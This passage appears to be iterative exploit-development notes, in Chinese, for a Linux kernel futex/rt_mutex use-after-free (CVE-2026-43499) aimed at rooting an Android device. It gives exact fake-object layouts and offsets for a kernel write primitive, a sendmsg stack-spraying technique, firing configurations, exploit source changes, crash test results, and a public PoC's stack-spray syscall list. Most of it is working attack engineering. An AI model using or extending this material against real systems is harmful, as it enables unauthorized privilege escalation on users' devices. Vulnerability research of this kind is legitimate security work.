   | `685` | `rt_mutex_enqueue()`：从 `fake_lock+0x10 = fake_w0` 下降一步到 `fake_w0->rb_left (= 0)` | `parent = fake_w0`、`leftmost = false` ⇒ `rb_link_node` ⇒ `rb_insert_color` ⇒ **§15.6 的三笔写** |
   | `698` | `!rt_mutex_owner(lock)` | `owner != 0` ⇒ **不唤醒** |
   | `711/727` | `waiter != fake_w0` 且 `prerequeue_top_waiter (fake_w0) != waiter` | 「无变化」⇒ 不调 `rt_mutex_adjust_prio()` |
   | `759` | `next_lock = task_blocked_on_lock(fake_task) = NULL` | `777` `goto out_put_task` ⇒ **干净返回 0** |

### 15.11 硬约束清单（实现时逐条核对）

| 对象 | 偏移 | 值 |
|---|---|---|
| `fake_lock` | `+0x00`（4 字节） | `0`（`_raw_spin_trylock` 只读这 4 字节，`+0x04/+0x08` 由它自己写） |
| `fake_lock` | `+0x10` | `fake_w0`（685 的下降起点） |
| `fake_lock` | `+0x18` | `fake_w0`（`rb_first_cached` 的 `rb_leftmost`） |
| `fake_lock` | `+0x20` | `fake_task`（非 0、非 W） |
| `fake_w0` | `+0x00` | `TARGET - 0x10`（16 字节对齐 ⇒ 偶数 ⇒ RED） |
| `fake_w0` | `+0x08` | `VALUE` |
| `fake_w0` | `+0x10` | `0`（下降在此停住） |
| `fake_w0` | `+0x38` | `fake_lock`（`BUG_ON`） |
| `fake_w0` | `+0x40` | `> W->prio`（如 `0x7fffffff`） |
| `fake_task` | `+0x8c8` | `0`（`pi_lock`） |
| `fake_task` | `+0x8f8` | `0`（`pi_blocked_on`） |
| 目标 | `TARGET - 0x10` | 必须 `== 0`（否则第四笔写到未知地址） |
| 目标 | `TARGET - 0x08` | 必须 `== 0` 或奇数（避开 Case 1） |
| `VALUE` | — | 可写，且 `≠ TARGET-0x10`、`≠ &waiter->tree_entry` |
| `sendmsg` | `msg_namelen` | `0x28` |
| `sendmsg` | `msg_iovlen` | **`≤ 5`**（关键：保住 `waiter+0x00..0x28`） |
| 涂写 | `waiter+0x38` | `fake_lock` |
| 涂写 | `waiter+0x40` | `0x7fffffff` |

### 15.12 本轮结论汇总

| # | 旧结论 | 新结论（证据） |
|---|---|---|
| 1 | §14.10「找不到帧 ≤ 0x1e0 且落到 `SP0-0x190` 的涂栈 syscall」 | **错。** `sendmsg` 的 `address`（`SP0-0x168`）+ `iovstack`（`SP0-0x1e8`）拼起来全覆盖 waiter（§15.2/§15.3） |
| 2 | §13 / `main.c:588`「`do_notify_resume` 把 waiter 完整冲掉」 | **错。** 实测帧 `[pt_regs-0x1b0, pt_regs)` = `[SP0-0x160, SP0+0x50)`，只覆盖 `waiter+0x30..0x50`（§15.4） |
| 3 | §14.6「用 `{fake_parent,0,0}` 绕过 `rb_erase`」 | **不可行。** `iov_len`/`iov_base` 都要过 `access_ok`，放不下内核地址 ⇒ 只能保住残余 `RB_CLEAR_NODE`（§15.7） |
| 4 | §14.11「涂写里 `prio` 取任何 ≠ `W->prio` 的值」 | **加强为**「取 `0x7fffffff`」：`task_to_waiter()` 是复合字面量，`prio` 不等即**两道门同时通过**，不再依赖消费者真的改了 W 的优先级（§15.5） |
| 5 | §14.5「`*(TARGET) = VALUE`，外加 `*(VALUE) = …`」 | **不完整。** 本内核 Case 3 还会写 `*(TARGET-0x10) = fake_w0`，并要求 `*(TARGET-0x10) == 0`（§15.6） |
| 6 | §6「`owner` 需要外部 task_struct」 | **不需要。** 用回收页内的 `fake_task`（`offset.h` 的 `FAKE_TASK_OFF`/`FAKE_TASK_PI_LOCK_OFF` 已备好）（§15.9） |
| 7 | — | **新：残余 waiter 的来源是 `rt_mutex_start_proxy_lock()` 里那次错位的 `remove_waiter()`（`current` 是 R 而非 W）；超时路径那次是正确清空的**（§15.8） |
| 8 | — | **新：`msg_iovlen ≤ 5` 是硬约束**，它是「保住 `waiter+0x00..0x28`」的唯一手段（§15.7） |

### 15.13 补充：链走的第 3 个入口 `remove_waiter()`，以及 §14.1 前提成立的确切原因

**（1）`remove_waiter()` 自己会触发链走**（`rtmutex.c:1115`，本轮逐字确认）：

```c
	rt_mutex_adjust_prio_chain(owner, RT_MUTEX_MIN_CHAINWALK, lock,
				   next_lock, NULL, current);
```
所以 `rt_mutex_adjust_prio_chain()` 一共有 **3** 个调用点，参数各不相同：

| 行 | 调用者 | `task` | `orig_lock` | `orig_waiter` | `top_task` | `chwalk` |
|---|---|---|---|---|---|---|
| `1004` | `task_blocks_on_rt_mutex` | `owner` | `lock` | **`waiter`（非 NULL）** | `task` | FULL/MIN |
| `1115` | **`remove_waiter`** | `owner` | `lock` | NULL | `current` | MIN |
| `1145` | `rt_mutex_adjust_pi` | `task` | **NULL** | NULL | `task` | MIN |

`top_waiter = orig_waiter` ⇒ **只有 1004 那条会进入 `545-560` 块**；1115 与 1145 都跳过它。

**⇒ designh 的 `walk_reached_725=1`（当时 `IONSTACK_REARM_FIRE=none`，消费者什么都没做）
最可能来自 `1115` 这条**：`remove_waiter()` 在 requeue / 超时里被调用时会顺手走链，
而它走的是 **`owner`（=M）** 的 waiter，**不是 W 的**。
这与 §14/§15 设计的「涂 W 的 waiter + `sched_setattr(W)`」是**不同**的路线。
**⇒ 实现时必须用 `IONSTACK_REARM_FIRE=sched`（默认值）显式走 `1145`，并单独确认 `walk_reached_725` 的来源。**

**（2）§14.1 的前提成立，但原因与 §14 写的不一样。**
超时路径**确实**会调 `rt_mutex_cleanup_proxy_lock()`（`futex.c:3345`），而它里面：

```c
	try_to_take_rt_mutex(lock, current, waiter);
	if (rt_mutex_owner(lock) != current) {
		remove_waiter(lock, waiter);   /* current == W ⇒ current->pi_blocked_on = NULL */
		cleanup = true;
	}
```
而 `remove_waiter()` 里是 `current->pi_blocked_on = NULL;`。
**所以只要 W 走到这里，W 的 `pi_blocked_on` 会被正确清空，UAF 就不存在。**

**W 之所以走不到，是因为 requeue 失败了。** `futex_requeue()` 在
`rt_mutex_start_proxy_lock()` 返回非 0 时走：

```c
		} else if (ret) {
			this->pi_state = NULL;
			put_pi_state(pi_state);
			break;                 /* ← 在此之前不会执行 this->key = key2 */
		}
```
即 **`q->key` 不会被更新成 `key2`**。于是 `handle_early_requeue_pi_wakeup()`
（`futex.c:3173-3190`，逐字）：

```c
	if (!match_futex(&q->key, key2)) {          /* ← 为真 */
		plist_del(&q->list, &hb->chain);
		hb_waiters_dec(hb);
		ret = -EWOULDBLOCK;
		if (timeout && !timeout->task)
			ret = -ETIMEDOUT;
		else if (signal_pending(current))
			ret = -ERESTARTNOINTR;
	}
	return ret;                                  /* ← 非 0 */
```
返回非 0 ⇒ `futex.c:3301 if (ret) goto out_put_keys;` ⇒ **根本不会执行 3342/3345**。
⇒ `W->pi_blocked_on` 保持 `rt_mutex_start_proxy_lock()`（`rtmutex.c:1806`，**R 的上下文**）
那次错位 `remove_waiter()` 留下的悬垂值。**✓**

**⇒ 新硬约束：requeue 必须返回非 0（`-EDEADLK`，即 HOLD 构型）。**
这同时意味着 `ROUTE_WAIT_SECONDS = 8` 的超时**不是必需的**：W 在 `futex_requeue` 唤醒它之后
就会立刻从 futex 返回（`-EWOULDBLOCK`），超时只是兜底。**开火窗口因此比原先设想宽得多。**

### 15.14 更正 D（本节推翻 §15.13 的那句「宽得多」），载体约束，以及本轮实现落地

**（1）更正 D：失败的 requeue 根本不会唤醒 W。** `futex_requeue()` 在
`rt_mutex_start_proxy_lock()` 返回非 0 时的分支（`futex.c:2172-2187`，逐字）：

```c
			} else if (ret) {
				this->pi_state = NULL;
				put_pi_state(pi_state);
				/*
				 * We stop queueing more waiters and let user
				 * space deal with the mess.
				 */
				break;                    /* ← 没有 requeue_pi_wake_futex() */
			}
```

只有 `ret == 1`（真的拿到锁）才走 `requeue_pi_wake_futex(this, &key2, hb2)`。
**所以 W 不会因为 requeue 失败而提前醒来**，它会一直阻塞到自己的绝对超时
（`ROUTE_WAIT_SECONDS`），然后经 `handle_early_requeue_pi_wakeup()` → `-ETIMEDOUT`
→ `futex.c:3301 goto out_put_keys` 返回。§15.13 里「W 在 `futex_requeue` 唤醒它之后就会立刻
从 futex 返回（`-EWOULDBLOCK`）」**是错的**；实际时间线是

```
T0           R 的 FUTEX_CMP_REQUEUE_PI 返回 -EDEADLK（残余 waiter 形成）
T0+2500ms    M 的 IONSTACK_OWNER_LOCK_TIMEOUT_MS 到点（默认）← 危险，见（3）
T0+8s        W 的 FUTEX_WAIT_REQUEUE_PI 超时返回 -ETIMEDOUT
T0+8s+ε      W 进入阻塞 sendmsg，涂写落地
T0+8s+ε+Δ    消费者 sched_setattr(W) → rt_mutex_adjust_pi(W) → 链走 → 写
```

**⇒ 硬约束：`IONSTACK_PAINT_PROBE_MS` 必须 > `ROUTE_WAIT_SECONDS * 1000`**（默认 30000 ✓）。

**（2）载体约束：AF_UNIX 的**流**socket 完全不能当涂写载体。** 三种 AF_UNIX 类型里只有一种可用：

| 类型 | `msg_namelen != 0` 时的行为 | 能用？ |
|---|---|---|
| `SOCK_STREAM` | `unix_stream_sendmsg()`（`af_unix.c:1860`）直接 `err = sk->sk_state == TCP_ESTABLISHED ? -EISCONN : -EOPNOTSUPP; goto out_err;` | **不能** |
| `SOCK_DGRAM` | 走 `unix_mkname()`，要求 `sun_family == AF_UNIX` 且 `sun_path` 是合法名字，之后还要 `unix_find_other()` 命中一个真实的、接收队列已满的对端 | 麻烦 |
| **`SOCK_SEQPACKET`** | `unix_seqpacket_sendmsg()`（`af_unix.c:2067`）**静默把 `msg_namelen` 清 0**，然后调 `unix_dgram_sendmsg()` | **✓ 首选** |

`SOCK_SEQPACKET` 的三个好处：`___sys_sendmsg()` 里的 `move_addr_to_kernel()` 已经先跑完
（涂写落地）；`unix_dgram_sendmsg()` 随后在 `sock_alloc_send_pskb()`（`af_unix.c:1687`）
上因发送缓冲耗尽而**阻塞**（帧存活）；而且它对 `SOCK_SEQPACKET` 会**跳过**
`security_unix_may_send()`（`af_unix.c:1768` 的 `if (sk->sk_type != SOCK_SEQPACKET)`）。
因此实现用 `socketpair(AF_UNIX, SOCK_SEQPACKET)` + 小 `SO_SNDBUF` + 预先灌满 + 对端不读。

**（3）新硬约束：`IONSTACK_OWNER_LOCK_TIMEOUT_MS` 必须大于 `ROUTE_WAIT_SECONDS * 1000`。**
否则 M 会在 W 涂写之前先超时，走 `remove_waiter()` → `rtmutex.c:1115` 那条链
（§15.13(1)），而那次链走会在 `rtmutex.c:685` 用 `rb_link_node()` **重写
`waiter->tree_entry`（`waiter+0x00/0x08/0x10`）**，把 §15.7 赖以成立的那个残余
`RB_CLEAR_NODE` 破坏掉。此后真正的开火在 `rtmutex.c:664` 就会走
`rb_erase(&waiter->tree_entry, &fake_lock->waiters)`（一个父指针指向**别的**树的节点），
基本必崩。**⇒ 实现时必须把 owner 超时抬到 8s 以上（建议 60000）。**

**（4）另一条实现约束：消费者的 nice 必须 ≠ W 的 nice。** `__sched_setscheduler()`
在 `policy` 与 nice 都没变时会走 `sched/core.c:5097` 的提前返回，
**根本到不了 `sched/core.c:5213` 的 `rt_mutex_adjust_pi(p)`**。默认
`IONSTACK_W_NICE=1`、`IONSTACK_CONSUMER_NICE` 取 `PSELECT_CONSUMER_NICE=19`，满足。

**（5）本轮已落地的代码**（全部默认关闭，靠环境变量打开）：

| 文件 | 改动 |
|---|---|
| `src/exploit/main.c` | 新增 `sendmsg_paint_setup()` / `sendmsg_paint_waiter()`（涂写原语）、`run_paint_oracle()`（开火编排）、`verify_paint_gate()`（读回校验）；`waiter_thread()` 在 futex 返回后先走涂写分支；`run_main_route_threads()` 解析开关、建 socket、选择 paint 路由（优先级高于 rearm/hold） |
| `src/exploit/util.c` | `prepare_skb_payload()` 新增 rb_insert Case 3 形状（`IONSTACK_INSERT_TARGET_OFF` / `IONSTACK_INSERT_VALUE_OFF`，把 `fake_w0->__rb_parent_color = TARGET-0x10`、`fake_w0->rb_right = VALUE`，并把 `TARGET-0x10 / TARGET-0x08 / TARGET / VALUE` 四处清零）；新增 `snapshot_reclaim_page()` 作为读回预言机 |
| `src/exploit/common.h` | 声明 `insert_target_addr` / `insert_value_addr` / `snapshot_reclaim_page()` |
| `src/device/ionstack_reroot_device.c` | 白名单新增 `IONSTACK_SENDMSG_PAINT` / `IONSTACK_PAINT_SNDBUF` / `IONSTACK_PAINT_PROBE_MS` / `IONSTACK_PAINT_SETTLE_MS` / `IONSTACK_INSERT_TARGET_OFF` / `IONSTACK_INSERT_VALUE_OFF` |

**（6）读回预言机（写门）不需要任何内核读原语。** 回收页本身就能从用户态读回：
`snapshot_held_reclaim_fragment()`（`util.c:1510`）用 `tee()` 把 `reclaim_frag_pipe[0]`
零拷贝复制一份再 `read()`，配合 `recv(..., MSG_PEEK)` 拿到尾段。于是
`IONSTACK_INSERT_TARGET_OFF` 指到页内时，`*(TARGET)`、`*(TARGET-0x10)`、`*(VALUE)`
三笔写都能直接比对，`paint-gate` 一行就是写门的判据。

**（7）推荐的第一次门验证环境变量组合：**

```
IONSTACK_STAGE=t878u-pselect-root
IONSTACK_ROUTE_HOLD=1
IONSTACK_SENDMSG_PAINT=1
IONSTACK_REARM_FIRE=sched
IONSTACK_OWNER_LOCK_TIMEOUT_MS=60000      # ← (3)
IONSTACK_INSERT_TARGET_OFF=0x3040         # 页内（payload 偏移）
IONSTACK_INSERT_VALUE_OFF=0x3080
```
期望日志：`paint socket ready …` → `paint: W futex returned ret=-1 errno=110 …`
→ `paint in flight … arming consumer` → `paint-gate … hit=1 … write_gate=1`。

### 15.15 更正 E：`rtmutex.c:716` 的守卫**成立**，第一次开火把设备打崩了

§15.10 的表格里写着

> | `711/727` | `waiter != fake_w0` 且 `prerequeue_top_waiter (fake_w0) != waiter` | 「无变化」⇒ 不调 `rt_mutex_adjust_prio()` |

**这句是错的**，而它正是第一次门测试（`scratch/runs/paint_20261001_172408.log`）在消费者开火的瞬间
把设备打崩（`CONFIG_PANIC_ON_OOLE=y`，`boot_id` 从 `20c8f935-…` 变成 `1e7f0749-…`）的原因。

**（1）为什么 716 成立。** §15.10 假定 `rt_mutex_enqueue()` 的下降停在 `fake_w0->tree_entry.rb_left`
之后 `leftmost = false`（表格里就写着 `leftmost = false`）。但逐字读 `rtmutex.c:271-292`：

```c
	struct rb_node **link = &lock->waiters.rb_root.rb_node;
	bool leftmost = true;

	while (*link) {
		parent = *link;
		entry = rb_entry(parent, struct rt_mutex_waiter, tree_entry);
		if (rt_mutex_waiter_less(waiter, entry)) {
			link = &parent->rb_left;          /* ← 向左不改变 leftmost */
		} else {
			link = &parent->rb_right;
			leftmost = false;                 /* ← 只有向右才清掉 */
		}
	}
	rb_link_node(&waiter->tree_entry, parent, link);
	rb_insert_color_cached(&waiter->tree_entry, &lock->waiters, leftmost);
```

而本内核的 `rb_insert_color_cached()` 是（`lib/rbtree.c:466-471`）：

```c
void rb_insert_color_cached(struct rb_node *node,
			    struct rb_root_cached *root, bool leftmost)
{
	__rb_insert(node, &root->rb_root, leftmost,
		    &root->rb_leftmost, dummy_rotate);
}
```
`__rb_insert()` 第一件事（`lib/rbtree.c:103-104`）就是

```c
	if (newleft)
		*leftmost = node;                 /* root->rb_leftmost = &waiter->tree_entry */
```

**下降向左 ⇒ `leftmost == true` ⇒ `fake_lock->waiters.rb_leftmost` 被改写成
`&waiter->tree_entry`。** 于是 `rt_mutex_top_waiter(fake_lock)`（`rb_first_cached` =
`root->rb_leftmost`）返回的是 **`waiter` 自己**，`rtmutex.c:716` 的
`if (waiter == rt_mutex_top_waiter(lock))` **成立**。

**（2）向下就崩在哪。** 716 成立 ⇒ 723-725 全部执行：

```c
		rt_mutex_dequeue_pi(task, prerequeue_top_waiter);   /* 723，prerequeue_top_waiter == fake_w0 */
		rt_mutex_enqueue_pi(task, waiter);                  /* 724 */
		rt_mutex_adjust_prio(task);                         /* 725 */
```

`rt_mutex_dequeue_pi()`（`rtmutex.c:327-335`）唯一的护栏是

```c
	if (RB_EMPTY_NODE(&waiter->pi_tree_entry))
		return;
	rb_erase_cached(&waiter->pi_tree_entry, &task->pi_waiters);
```

而当时的形状是 `ghostlock-right`，它把 `fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF`（= `fake_w0+0x18`）
写成了 `write_pc = fake_parent = data_addr(ASHMEM_MISC_FOPS) - 0x08`（运行日志里的
`fake_pi_entry=ffffffc8386c13b8`、`fake_parent=ffffffc00338d190`）。
`RB_EMPTY_NODE` 要求 `__rb_parent_color == 自身`，这里显然不是 ⇒
**对一个伪造节点做真正的 `rb_erase_cached(&fake_w0->pi_tree_entry, &init_task->pi_waiters)`**
（当时 `lock_owner_mode=init-task`）⇒ 立刻 panic。**§15.10 里「无变化」那一格作废。**

**（3）`leftmost` 为什么**不能**绕开。** 想拿 `leftmost = false` 就必须让下降**向右**，也就是
`rt_mutex_waiter_less(waiter, entry) == 0`，即 `waiter->prio >= fake_w0->prio`。但注意
`rtmutex.c:682` 在 685 **之前**刚把 `waiter->prio` 覆写成 `task->prio`（= `W->prio`），
而向右时 `rb_link_node()` 会把 `fake_w0->tree_entry.rb_right = &waiter->tree_entry`，
接着 `__rb_insert()` 的 `tmp = parent->rb_right; if (node == tmp)` 必然成立 ⇒ 走 **Case 2**
（`lib/rbtree.c:156-180`），原语失效。**⇒ Case 3 原语与 `leftmost = true` 是绑定的，
必须正面处理 723-725。**

**（4）修复（已落地，形状名 `rbinsert`）。** 三条最小改动：

| # | 改动 | 作用 |
|---|---|---|
| 1 | `fake_w0 + 0x18 = fake_w0 + 0x18`（`write_pc = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF`） | 使 `RB_EMPTY_NODE(&fake_w0->pi_tree_entry)` 为真 ⇒ 723 走 `rtmutex.c:330` 的安全提前返回 |
| 2 | `fake_task->pi_top_task`（`0x8f0`）= **0** | 725 的 `rt_mutex_adjust_prio(fake_task)` 会把 `pi_task` 算成 `task_top_pi_waiter(fake_task)->task = waiter->task = 0`，于是走到 `rt_mutex_setprio(fake_task, NULL)`；`sched/core.c:4603` 的快路径要求 `p->pi_top_task == pi_task == NULL`，否则会去解引用 `fake_task->sched_class`（= 0）而崩 |
| 3 | `IONSTACK_FOPS_LOCK_OWNER_MODE=fake-task`（`owner = fake_task`） | 让 724 的 `rt_mutex_enqueue_pi()` 把 `waiter->pi_tree_entry` 插进**回收页里的** `fake_task->pi_waiters`，而不是污染 `init_task->pi_waiters` |

附带一条：`fake_w0->prio` 必须 **大于 `W->prio`**。`rtmutex.c:682` 之后下降比较的是
`W->prio`（= `120 + consumer nice`，默认 19 ⇒ **139**），而 `FAKE_WAITER_PRIO` 默认只有 **130**，
会向右拐。`rbinsert` 形状因此在解析到默认值时把它抬到 **250**。

`rbinsert` 形状下 723-725 与后续 759-793 的完整行为：

| 行 | 动作 | 结果 |
|---|---|---|
| `664` | `rt_mutex_dequeue(fake_lock, waiter)` | 残余 `RB_CLEAR_NODE` ⇒ 空操作（§15.7） |
| `682-683` | `waiter->prio = W->prio` | 只影响下降方向，不影响门（门在 1135/569 已过） |
| `685` | 下降 `fake_w0` →（`W->prio < 250`）向左 → `fake_w0->rb_left == 0` 停 | `parent = fake_w0`、`leftmost = true`；`rb_link_node` + `rb_insert_color` ⇒ §15.6 三笔写 |
| `716` | `waiter == rt_mutex_top_waiter(fake_lock)` | **成立**（`rb_leftmost` 已被改成 `&waiter->tree_entry`） |
| `723` | `rt_mutex_dequeue_pi(fake_task, fake_w0)` | 改动 1 ⇒ **提前返回** |
| `724` | `rt_mutex_enqueue_pi(fake_task, waiter)` | 写入 `fake_task->pi_waiters`（自页） |
| `725` | `rt_mutex_adjust_prio(fake_task)` | 改动 2 ⇒ `rt_mutex_setprio` 快路径返回 |
| `759/777` | `task_blocked_on_lock(fake_task) == NULL` | `goto out_put_task` ⇒ 干净返回 0 |
| `792` | `put_task_struct(fake_task)` | `usage` 0x101 → 0x100 ⇒ 不触发 `__put_task_struct` |

**（5）推荐的门验证环境变量组合（更新版）：**

```
IONSTACK_STAGE=t878u-pselect-root
IONSTACK_ROUTE_HOLD=1
IONSTACK_SENDMSG_PAINT=1
IONSTACK_REARM_FIRE=sched
IONSTACK_OWNER_LOCK_TIMEOUT_MS=60000      # §15.14(3)
IONSTACK_FOPS_PI_RB_SHAPE=rbinsert        # ← 本节
IONSTACK_FOPS_LOCK_OWNER_MODE=fake-task   # ← 本节
IONSTACK_INSERT_TARGET_OFF=0x3040         # 页内（payload 偏移）
IONSTACK_INSERT_VALUE_OFF=0x3080
```

---

### 15.16 更正 F：崩溃取证通道已失效；改用「可存活探针」证明涂写并未落地

#### (1) 更正 §15.15(2)(3)：那两段依赖的转储不可信

§15.15 声称 17:24 那次崩在 `rtmutex.c:723` 的 `rb_erase`，并据此推出 `rbinsert` 形状。
**这个结论站不住**：设备 `/data/log` 里的 `dumpstate_lastkmsg_828_20261001_172439_KP.log.gz`
解出的内容与更早的 `prev_dump_designj.log` **逐字节同源**（同为 uptime `1868.816178`、
同一 canary `0x56fbdcba4ce30b1f`、同一 `x19`/`x25`），说明 828 是**陈旧副本**，
而 design-j 那次根本没走 sendmsg 涂写。仓库里**没有任何一份转储出现过 `rb_erase`
/`rb_insert_color` 崩溃**。§15.15(2)(3) 应改为：那次仍是 `rtmutex.c:585`、
`lock` 为栈 garbage 的老崩溃。

#### (2) 崩溃取证通道已经死了（重要）

- `/proc/kmsg`、`/proc/last_kmsg`、`/sys/fs/pstore`、`dmesg` 对 `uid 2000 shell`
  **全部 Permission denied**。
- 19:03、19:19、19:24、19:33 的涂写跑**都没有产出转储**
  （`reboot_detected pstore_present=0`）；`/data/log` 里 **829 缺失**，
  830（18:47）**不含 panic**。
- ⇒ **不能再靠崩溃栈诊断**，后续迭代都必须自带用户态可观测性。

#### (3) 几何第 3 次独立复核：仍然正确

实测（objdump，本机 ELF `boot_kernel.bin.elf`）：

| 项 | 值 |
|---|---|
| `el0_svc_handler` / `el0_svc_common` 帧 | `-0x10` / `-0x40` |
| `jopp_springboard_blr_x20` | **净零**（`stp …[sp,#-0x10]!` … `ldp …[sp],#0x10` … `br x20`） |
| `sizeof(struct pt_regs)` | `0x130` ⇒ `SP0 = T-0x180`，syscall 入口 `E = T-0x188` |
| `__arm64_sys_sendmsg` 帧 | `0x90`，`msg_sys = sp` |
| `___sys_sendmsg` 帧 | `0x190`，`x29 = sp+0x140`，**`&address = x29-0x88 = sp+0xB8`** |
| `copy_msghdr_from_user` | `save_addr = NULL`，目的地址取 `kmsg->msg_name` |
| `move_addr_to_kernel` | `ulen <= 0x80` 即放行，`__arch_copy_from_user(&address, user, ulen)` |
| `struct rt_mutex_waiter` | `tree_entry@0` `pi_tree_entry@0x18` **`task@0x30` `lock@0x38` `prio@0x40` `deadline@0x48`** |

⇒ `address = E-0x170`，`rt_waiter = E-0x198`，**`address = rt_waiter + 0x28`**（与 SP0 无关，
两次 syscall 共用同一 `E`）。残余 waiter 实测 `T_W-0x320`。**几何没有错。**

> **基准约定注**：本节用 `E = T-0x188`（syscall 入口 SP）；`ROOT_CHAIN_THEORY.md` /
> `PAINT_ORACLE_ANALYSIS.md` 用 `SP0 = T-0x180`，于是 `E = SP0-0x08`，
> 同一对地址写成 `E-0x198 / E-0x170` 或 `SP0-0x190 / SP0-0x168` 都正确，**不是笔误**。
> 唯一要紧的量是差值 `0x28`，它在两种约定下都一样。

#### (4) 可存活探针的原理（新增 `IONSTACK_PAINT_PRIO` / `IONSTACK_PAINT_FILL`）

`rtmutex.c:1135`：

```c
if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task))) {
        raw_spin_unlock_irqrestore(&task->pi_lock, flags);
        return;                       /* ← 在 1139 next_lock = waiter->lock 之前 */
}
```

`task_to_waiter(p)`（rtmutex.c:230-231）是复合字面量
`&(struct rt_mutex_waiter){ .prio = (p)->prio, .deadline = (p)->dl.deadline }`；
`rt_mutex_waiter_equal()`（rtmutex.c:253-269）在 `prio` 相等且非 dl 时直接 `return 1`。
而 `sched/core.c:5213` 的 `rt_mutex_adjust_pi(p)` 在 `__setscheduler` **之后**执行，
所以此时 `W->prio == 120 + consumer_nice == 139`。

⇒ **把涂抹的 `prio` 写成 139，就能让 `sched_setattr(W)` 在读 `waiter->lock` 之前早退**：

- 涂写命中 → `rtmutex.c:1135` 早退 → **设备存活**；
- 涂写未命中 → `prio` 是栈垃圾 → 走到 `rtmutex.c:585` `raw_spin_trylock(垃圾)` → **panic**。

`IONSTACK_PAINT_FILL=1` 进一步把整个 `sockaddr_storage`（0x80）填满 32-bit `prio`，
使 `waiter->prio` 在 **[-0x18, +0x68]** 的任意偏移误差下都会被命中，从而排除几何误差。

#### (5) 实测结果：三种配置全部崩溃 ⇒ 涂写没有落地

| 运行 | `PAINT_PRIO` | `PAINT_FILL` | `namelen` | 结果 |
|---|---|---|---|---|
| `paintprobe_20261001_191941` | 121 | 0 | 0x28 | **崩**（`af3b9a76…`→`10a188d7…`） |
| `paintprobe139_20261001_192402` | **139** | 0 | 0x28 | **崩**（→`f51ac904…`） |
| `paintfill139_20261001_193311` | **139** | **1** | **0x80** | **崩**（→`ce1acbec…`） |

三次的 `paint payload … prio=… fill=… namelen=…` 行都确认值已送达设备；
三次都**没有**出现 `paint sendmsg returned`（即 sendmsg 确实在 `sock_alloc_send_pskb()`
阻塞，两份拷贝都已发生）。

**⇒ 结论：`sendmsg` 涂写根本没有写到残余 waiter。** 而且 0x80 全填充也失败，
说明不是 ±0x18 量级的偏移误差，而是**`address` 与残余 waiter 相距很远，
或残余 `pi_blocked_on` 并不指向 W 自己栈上的那个 `rt_waiter`**。

#### (6) 下一步必须做的事

1. **先恢复可观测性**，否则每轮都是盲跑。优先查清残余 `pi_blocked_on` 到底指向哪里：
   `rt_mutex_start_proxy_lock(&pi_mutex, this->rt_waiter, this->task)`（futex.c:2156）把
   `this->task->pi_blocked_on` 指到 `this->rt_waiter`；而 `remove_waiter()` 清的是
   **`current->pi_blocked_on`**（rtmutex.c:1079）。若清理由 **R（requeue 线程）**发起、
   而 `pi_blocked_on` 记在 **W** 上，就会出现“错靶清理”，残余指针可能落在 **R 的栈**上
   —— 那么涂写必须让 **R** 来做，而不是 W。
2. 在拿到一份可信崩溃栈之前，不要再花设备重启去试新的 payload 形状。
3. `IONSTACK_PAINT_PRIO` / `IONSTACK_PAINT_FILL` 应保留：它们是唯一不依赖转储的
   「涂写是否落地」判据。

---

### 15.17 公开成功案例（NebuSec / IonStack part II）：**没有用 `sendmsg`**

2026-10-01 联网核实。针对**同一个 CVE-2026-43499** 的公开成功利用是
NebuSec 的 *IonStack part II*（<https://nebusec.ai/research/ionstack-part-2/>），
代码在 <https://github.com/NebuSec/CyberMeowfia/tree/main/IonStack/CVE-2026-43499>。

#### (1) 官方补丁 100% 印证了 §15.16(6) 的「错靶清理」怀疑

`3bfdc63936dd4773109b7b8c280c0f3b5ae7d349` 的注释与改动：

```c
+ * When invoked from rt_mutex_start_proxy_lock() waiter::task != current !
  static void __sched remove_waiter(struct rt_mutex_base *lock, …)
  {
- 	raw_spin_lock(&current->pi_lock);
- 	rt_mutex_dequeue(lock, waiter);
- 	current->pi_blocked_on = NULL;
- 	raw_spin_unlock(&current->pi_lock);
+ 	struct task_struct *waiter_task = waiter->task;
+ 	scoped_guard(raw_spinlock, &waiter_task->pi_lock) {
+ 		rt_mutex_dequeue(lock, waiter);
+ 		waiter_task->pi_blocked_on = NULL;
+ 	}
```

引入：`8161239a8bcce`（2.6.39-rc1）；受影响 **15 年**。

#### (2) 触发序列（与我们的实现有重要差异）

公开 PoC 的三 futex 环：

1. **W**：`FUTEX_LOCK_PI(f_pi_chain)` ⇒ **W 先持有 `f_pi_chain`**；
   再 `FUTEX_WAIT_REQUEUE_PI(f_wait → f_pi_target)`（超时仅 **50 ms**），
   `rt_mutex_waiter` 落在 **W 自己的栈**上。
2. **owner**：`FUTEX_LOCK_PI(f_pi_target)` ⇒ owner 持有 `f_pi_target`；
   再 `FUTEX_LOCK_PI(f_pi_chain)` ⇒ **阻塞**（W 持有）。
3. **main**：`FUTEX_CMP_REQUEUE_PI(f_wait → f_pi_target)`。

链走成环 `W → f_pi_target → owner → f_pi_chain → W`，返回 **`-EDEADLK`**，
走 buggy rollback ⇒ **W 带着悬垂 `pi_blocked_on` 被唤醒**。

**⚠️ 差异：我们这边 `[*] requeue ret=-1 errno=35`（EAGAIN），不是 -EDEADLK；
且 W 是 `errno=110`（ETIMEDOUT，8 s 超时）退出的。**
即**我们很可能压根没走到 `rt_mutex_start_proxy_lock()` 的 rollback 路径**，
这是比「涂哪一段栈」更靠前的问题，必须优先修。

#### (3) 栈帧回收：**没有 `sendmsg`**，且策略是「反复涂 + 竞态」

公开 PoC 的 `stamps[]` 候选（8 个，**不含 sendmsg / writev / recvmsg**）：

| 函数 | syscall | 内核栈缓冲 |
|---|---|---|
| `stamp_prctl` | `prctl(PR_SET_MM, PR_SET_MM_MAP)` | `unsigned long user_auxv[AT_VECTOR_SIZE]`（~352 B） |
| `stamp_socket` | `setsockopt(IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP)` | `struct group_source_req`（~264 B） |
| `stamp_pselect` | `pselect6(256, r, w, e, …)` | `core_sys_select` 的 `stack_fds`（6 组 × 32 B ≈ 192 B） |
| `stamp_process_vm` | `process_vm_readv/writev`（`iovec[8]`） | `struct iovec iovstack[8]`（128 B） |
| `stamp_tcp` | `getsockopt(IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, len=128)` | optval 栈缓冲 |
| `stamp_keyctl` | `keyctl(KEYCTL_DH_COMPUTE / KEYCTL_INSTANTIATE_IOV)` | `iovec[8]` |
| `stamp_fd` | `timerfd_create` / `F_DUPFD` / `dup2` | fd 相关栈局部 |
